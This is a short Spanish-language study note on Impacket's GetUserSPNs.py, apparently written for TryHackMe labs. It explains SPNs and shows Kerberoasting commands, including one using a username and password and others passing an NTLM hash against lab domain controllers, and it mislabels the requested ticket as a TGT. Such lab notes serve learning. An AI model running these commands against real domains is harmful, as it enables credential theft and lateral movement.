Es una de las herramientas proporcionadas por Impacket. Esta herramienta en particular se utiliza para obtener los Service Principal Names (SPNs) de usuarios en un dominio de Active Directory. 

Los SPNs son identificadores únicos asociados a servicios que se ejecutan bajo el contexto de una cuenta de usuario en un dominio de Active Directory. Son esenciales para la autenticación Kerberos y, por lo tanto, son críticos en el contexto de la seguridad y la administración de sistemas Windows.

# Obtener SPNs con usuario
```
GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi! -dc-ip 10.10.116.29 -request
```
![[Pasted image 20240716093412.png]]
- `-request`: indica que se debe realizar una solicitud para obtener los SPNs.

# Obtener SPNs con hash de usuario
Ahora realizaremos un ataque de Kerberoasting con `GetUserSPNs`
```
GetUserSPNs.py -dc-ip 10.10.25.146 raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d
```
![[Pasted image 20240731115759.png]]

Ahora que sabemos que existe una cuenta podemos obtener el TGT
```
GetUserSPNs.py -dc-ip 10.10.25.146 raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -request
```
![[Pasted image 20240731120040.png]]